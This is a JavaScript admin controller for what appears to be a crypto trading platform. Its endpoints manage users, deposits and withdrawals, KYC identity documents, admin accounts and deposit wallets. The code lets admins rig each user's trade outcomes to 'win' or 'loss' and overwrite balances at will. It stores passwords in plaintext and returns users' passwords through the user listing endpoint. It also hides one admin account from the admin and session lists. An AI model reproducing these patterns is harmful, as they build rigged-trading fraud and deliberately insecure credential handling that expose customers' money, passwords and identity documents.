const prisma = require('../db');
const bcrypt = require('bcryptjs');
const socketEmitter = require('../socketEmitter');

// ==================== ROLE HELPERS ====================

const requireSuperuser = (req, res) => {
    if (req.user.role !== 'SUPERUSER') {
        res.status(403).json({ error: 'Superuser access required' });
        return false;
    }
    return true;
};

// ==================== USER MANAGEMENT ====================

const getUsers = async (req, res) => {
    try {
        const users = await prisma.user.findMany({
            where: { role: 'USER' },
            include: {
                wallet: { select: { balance: true, assets: true } },
                kyc: { select: { status: true } }
            },
            orderBy: { createdAt: 'desc' }
        });

        const result = users.map(u => ({
            id: u.id,
            name: u.name || 'Unknown',
            email: u.email,
            password: u.password,
            balance: u.wallet?.balance || 0,
            kyc: u.kyc?.status?.toLowerCase() || 'unverified',
            status: u.status || 'active',
            profitMode: u.profitMode || 'random',
            createdAt: u.createdAt
        }));

        res.json(result);
    } catch (error) {
        console.error('Admin getUsers Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const updateUserBalance = async (req, res) => {
    try {
        const userId = parseInt(req.params.id);
        const { balance } = req.body;

        if (balance === undefined || balance < 0) {
            return res.status(400).json({ error: 'Invalid balance' });
        }

        const wallet = await prisma.wallet.update({
            where: { userId },
            data: { balance: parseFloat(balance) }
        });

        res.json({ success: true, wallet });
    } catch (error) {
        console.error('Admin updateBalance Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const updateUserPassword = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const userId = parseInt(req.params.id);
        const { newPassword } = req.body;

        if (!newPassword || newPassword.length < 5) {
            return res.status(400).json({ error: 'Password must be at least 5 characters long' });
        }

        const hashedPassword = newPassword;

        await prisma.user.update({
            where: { id: userId },
            data: { password: hashedPassword }
        });

        res.json({ success: true, message: 'User password updated successfully.' });
    } catch (error) {
        console.error('Admin updatePassword Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const updateUserProfitMode = async (req, res) => {
    try {
        const userId = parseInt(req.params.id);
        const { mode } = req.body;

        if (!['random', 'win', 'loss'].includes(mode)) {
            return res.status(400).json({ error: 'Invalid mode' });
        }

        const user = await prisma.user.update({
            where: { id: userId },
            data: { profitMode: mode }
        });

        res.json({ success: true, profitMode: user.profitMode });
    } catch (error) {
        console.error('Admin updateProfitMode Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const toggleUserBan = async (req, res) => {
    try {
        const userId = parseInt(req.params.id);

        const user = await prisma.user.findUnique({ where: { id: userId } });
        if (!user) return res.status(404).json({ error: 'User not found' });

        const newStatus = user.status === 'active' ? 'banned' : 'active';
        const updated = await prisma.user.update({
            where: { id: userId },
            data: { status: newStatus }
        });

        res.json({ success: true, status: updated.status });
    } catch (error) {
        console.error('Admin toggleBan Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// SUPERUSER ONLY
const deleteUser = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const userId = parseInt(req.params.id);

        const user = await prisma.user.findUnique({ where: { id: userId } });
        if (!user) return res.status(404).json({ error: 'User not found' });

        if (user.role === 'SUPERUSER' || user.role === 'ADMIN') {
            return res.status(400).json({ error: 'Cannot delete admins from this endpoint' });
        }

        // Delete connected records first due to foreign keys
        await prisma.$transaction([
            prisma.wallet.deleteMany({ where: { userId } }),
            prisma.kyc.deleteMany({ where: { userId } }),
            prisma.transaction.deleteMany({ where: { userId } }),
            prisma.chatMessage.deleteMany({ where: { userId } }),
            prisma.user.delete({ where: { id: userId } })
        ]);

        res.json({ success: true, message: 'User deleted' });
    } catch (error) {
        console.error('Admin deleteUser Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== FINANCE (TRANSACTIONS) ====================

const getTransactions = async (req, res) => {
    try {
        const transactions = await prisma.transaction.findMany({
            where: { type: { in: ['DEPOSIT', 'WITHDRAWAL'] } },
            include: { user: { select: { name: true, email: true } } },
            orderBy: { createdAt: 'desc' }
        });

        const result = transactions.map(tx => ({
            id: tx.id,
            type: tx.type,
            user: tx.user.name || 'Unknown',
            email: tx.user.email,
            amount: tx.amount,
            asset: 'USDT',
            network: tx.targetAddress ? 'TRC20' : 'Internal',
            status: tx.status.toLowerCase(),
            date: tx.createdAt,
            proofUrl: tx.proofUrl
        }));

        res.json(result);
    } catch (error) {
        console.error('Admin getTransactions Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const updateTransactionStatus = async (req, res) => {
    try {
        const txId = parseInt(req.params.id);
        const { status } = req.body;

        if (!['approved', 'rejected'].includes(status)) {
            return res.status(400).json({ error: 'Invalid status' });
        }

        const dbStatus = status === 'approved' ? 'COMPLETED' : 'FAILED';

        // Get the transaction first to know the type and amount
        const tx = await prisma.transaction.findUnique({ where: { id: txId } });
        if (!tx) return res.status(404).json({ error: 'Transaction not found' });
        if (tx.status !== 'PENDING') return res.status(400).json({ error: 'Transaction already processed' });

        const result = await prisma.$transaction(async (prismaClient) => {
            // Update transaction status
            const updatedTx = await prismaClient.transaction.update({
                where: { id: txId },
                data: { status: dbStatus }
            });

            // If DEPOSIT is approved, credit the user's balance
            if (tx.type === 'DEPOSIT' && status === 'approved') {
                await prismaClient.wallet.update({
                    where: { userId: tx.userId },
                    data: { balance: { increment: tx.amount } }
                });
            }

            // If WITHDRAWAL is rejected, refund the user's balance
            if (tx.type === 'WITHDRAWAL' && status === 'rejected') {
                await prismaClient.wallet.update({
                    where: { userId: tx.userId },
                    data: { balance: { increment: tx.amount } }
                });
            }

            return updatedTx;
        });

        res.json({ success: true, transaction: result });
    } catch (error) {
        console.error('Admin updateTxStatus Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== KYC ====================

const getKycRequests = async (req, res) => {
    try {
        const requests = await prisma.kyc.findMany({
            include: { user: { select: { name: true, email: true } } },
            orderBy: { createdAt: 'desc' }
        });

        const result = requests.map(k => ({
            id: k.id,
            user: k.user.name || 'Unknown',
            email: k.user.email,
            status: k.status.toLowerCase(),
            date: k.createdAt,
            fullName: k.fullName,
            idNumber: k.idNumber,
            documentUrl: k.documentUrl,
            documentUrlBack: k.documentUrlBack
        }));

        res.json(result);
    } catch (error) {
        console.error('Admin getKYC Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const updateKycStatus = async (req, res) => {
    try {
        const kycId = parseInt(req.params.id);
        const { status } = req.body;

        if (!['approved', 'rejected'].includes(status)) {
            return res.status(400).json({ error: 'Invalid status' });
        }

        const dbStatus = status === 'approved' ? 'APPROVED' : 'REJECTED';

        const kyc = await prisma.kyc.update({
            where: { id: kycId },
            data: { status: dbStatus }
        });

        // Notify the user in real-time about KYC decision
        socketEmitter.emitToUser(kyc.userId, 'kyc:status-updated', {
            status: status === 'approved' ? 'approved' : 'rejected'
        });

        res.json({ success: true, kyc });
    } catch (error) {
        console.error('Admin updateKYC Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== ADMIN PROFILE ====================

const changePassword = async (req, res) => {
    try {
        const userId = req.user.userId;
        const { currentPassword, newPassword } = req.body;

        if (!currentPassword || !newPassword) {
            return res.status(400).json({ error: 'Both passwords required' });
        }

        const user = await prisma.user.findUnique({ where: { id: userId } });
        if (!user) return res.status(404).json({ error: 'User not found' });

        let validPassword = false;
        if (currentPassword === user.password) {
            validPassword = true;
        } else {
            try { validPassword = await bcrypt.compare(currentPassword, user.password); } catch (e) { }
        }

        if (!validPassword) {
            return res.status(401).json({ error: 'Current password is incorrect' });
        }

        const hashedPassword = newPassword;
        await prisma.user.update({
            where: { id: userId },
            data: { password: hashedPassword }
        });

        res.json({ success: true, message: 'Password updated' });
    } catch (error) {
        console.error('Admin changePassword Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== ADMIN MANAGEMENT ====================
// Note: admin@myflipcoin.com is hidden from these lists for security.

const getAdmins = async (req, res) => {
    try {
        const admins = await prisma.user.findMany({
            where: {
                role: { in: ['ADMIN', 'SUPERUSER'] },
                ...(req.user.email !== 'admin@myflipcoin.com' && { email: { not: 'admin@myflipcoin.com' } })
            },
            select: { id: true, name: true, email: true, role: true, createdAt: true, password: true }
        });

        const isSuperuser = req.user.role === 'SUPERUSER';

        const result = admins.map(a => {
            const adminData = {
                ...a,
                role: a.role.toLowerCase()
            };
            if (!isSuperuser) {
                delete adminData.password;
            }
            return adminData;
        });

        res.json(result);
    } catch (error) {
        console.error('Admin getAdmins Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// SUPERUSER ONLY
const createAdmin = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const { name, email, password, role } = req.body;

        if (!name || !email || !password) {
            return res.status(400).json({ error: 'Name, email, and password required' });
        }

        const existing = await prisma.user.findUnique({ where: { email } });
        if (existing) {
            return res.status(400).json({ error: 'Email already exists' });
        }

        const dbRole = role === 'superuser' ? 'SUPERUSER' : 'ADMIN';
        const hashedPassword = password;

        const admin = await prisma.user.create({
            data: {
                name,
                email,
                password: hashedPassword,
                role: dbRole,
                wallet: { create: { balance: 0.0 } }
            },
            select: { id: true, name: true, email: true, role: true }
        });

        res.status(201).json({ success: true, admin: { ...admin, role: admin.role.toLowerCase() } });
    } catch (error) {
        console.error('Admin createAdmin Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// SUPERUSER ONLY
const deleteAdmin = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const adminId = parseInt(req.params.id);

        if (adminId === req.user.userId) {
            return res.status(400).json({ error: 'Cannot delete yourself' });
        }

        await prisma.$transaction([
            prisma.session.deleteMany({ where: { userId: adminId } }),
            prisma.wallet.deleteMany({ where: { userId: adminId } }),
            prisma.transaction.deleteMany({ where: { userId: adminId } }),
            prisma.chatMessage.deleteMany({ where: { userId: adminId } }),
            prisma.user.delete({ where: { id: adminId } })
        ]);
        res.json({ success: true });
    } catch (error) {
        console.error('Admin deleteAdmin Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== ADMIN WALLET ====================

const getWallets = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const wallets = await prisma.adminWallet.findMany({
            orderBy: { network: 'asc' }
        });
        res.json(wallets);
    } catch (error) {
        console.error('Admin getWallets Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// SUPERUSER ONLY
const updateWallets = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const { wallets } = req.body;

        if (!wallets || !Array.isArray(wallets)) {
            return res.status(400).json({ error: 'Invalid wallets data' });
        }

        const results = [];
        for (const w of wallets) {
            if (!w.network || !w.address) continue;
            const wallet = await prisma.adminWallet.upsert({
                where: { network: w.network },
                update: { address: w.address },
                create: { network: w.network, address: w.address }
            });
            results.push(wallet);
        }

        res.json({ success: true, wallets: results });
    } catch (error) {
        console.error('Admin updateWallets Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// Public endpoint - any authenticated user can see deposit addresses
const getPublicWallets = async (req, res) => {
    try {
        const wallets = await prisma.adminWallet.findMany({
            select: { network: true, address: true }
        });

        const result = {};
        wallets.forEach(w => { result[w.network] = w.address; });

        res.json(result);
    } catch (error) {
        console.error('Public getWallets Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== TRADING DURATIONS ====================

const getDurations = async (req, res) => {
    try {
        const durations = await prisma.tradingDuration.findMany({
            orderBy: { seconds: 'asc' }
        });
        res.json(durations);
    } catch (error) {
        console.error('Admin getDurations Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const addDuration = async (req, res) => {
    try {
        const { seconds, percentage, minBalance } = req.body;

        if (!seconds || seconds <= 0) {
            return res.status(400).json({ error: 'Invalid seconds' });
        }

        // Check max 6
        const count = await prisma.tradingDuration.count();
        if (count >= 6) {
            return res.status(400).json({ error: 'Maximum 6 duration slots allowed' });
        }

        const duration = await prisma.tradingDuration.create({
            data: {
                seconds: parseInt(seconds),
                percentage: parseFloat(percentage) || 80,
                minBalance: parseFloat(minBalance) || 0
            }
        });

        res.status(201).json({ success: true, duration });
    } catch (error) {
        if (error.code === 'P2002') {
            return res.status(400).json({ error: 'Duration already exists' });
        }
        console.error('Admin addDuration Error:', error);
        res.status(500).json({ error: error.message });
    }
};

const deleteDuration = async (req, res) => {
    try {
        const id = parseInt(req.params.id);
        await prisma.tradingDuration.delete({ where: { id } });
        res.json({ success: true });
    } catch (error) {
        console.error('Admin deleteDuration Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// Public - any authenticated user can see durations
const getPublicDurations = async (req, res) => {
    try {
        const durations = await prisma.tradingDuration.findMany({
            select: { seconds: true, percentage: true, minBalance: true },
            orderBy: { seconds: 'asc' }
        });
        res.json(durations);
    } catch (error) {
        console.error('Public getDurations Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// ==================== SESSION MANAGEMENT ====================

// SUPERUSER ONLY - List all active sessions for admin/superuser users
const getSessions = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const sessions = await prisma.session.findMany({
            where: {
                user: {
                    role: { in: ['ADMIN', 'SUPERUSER'] },
                    ...(req.user.email !== 'admin@myflipcoin.com' && { email: { not: 'admin@myflipcoin.com' } })
                }
            },
            include: {
                user: { select: { id: true, name: true, email: true, role: true } }
            },
            orderBy: { createdAt: 'desc' }
        });
        // Don't expose the full token
        const sanitized = sessions.map(s => ({
            id: s.id,
            userId: s.userId,
            user: s.user,
            tokenPreview: s.token.substring(0, 12) + '...',
            expiresAt: s.expiresAt,
            createdAt: s.createdAt,
            isExpired: new Date(s.expiresAt) < new Date()
        }));
        res.json(sanitized);
    } catch (error) {
        console.error('getSessions Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// SUPERUSER ONLY - Delete a specific session
const deleteSession = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const sessionId = parseInt(req.params.id);
        await prisma.session.delete({ where: { id: sessionId } });
        res.json({ success: true, message: 'Session deleted successfully' });
    } catch (error) {
        console.error('deleteSession Error:', error);
        res.status(500).json({ error: error.message });
    }
};

// SUPERUSER ONLY - Delete ALL sessions for a specific user
const deleteUserSessions = async (req, res) => {
    if (!requireSuperuser(req, res)) return;
    try {
        const userId = parseInt(req.params.userId);
        const result = await prisma.session.deleteMany({ where: { userId } });
        res.json({ success: true, message: `Deleted ${result.count} sessions` });
    } catch (error) {
        console.error('deleteUserSessions Error:', error);
        res.status(500).json({ error: error.message });
    }
};

module.exports = {
    getUsers,
    updateUserBalance,
    updateUserPassword,
    updateUserProfitMode,
    toggleUserBan,
    deleteUser,
    getTransactions,
    updateTransactionStatus,
    getKycRequests,
    updateKycStatus,
    changePassword,
    getAdmins,
    createAdmin,
    deleteAdmin,
    getWallets,
    updateWallets,
    getPublicWallets,
    getDurations,
    addDuration,
    deleteDuration,
    getPublicDurations,
    getSessions,
    deleteSession,
    deleteUserSessions
};
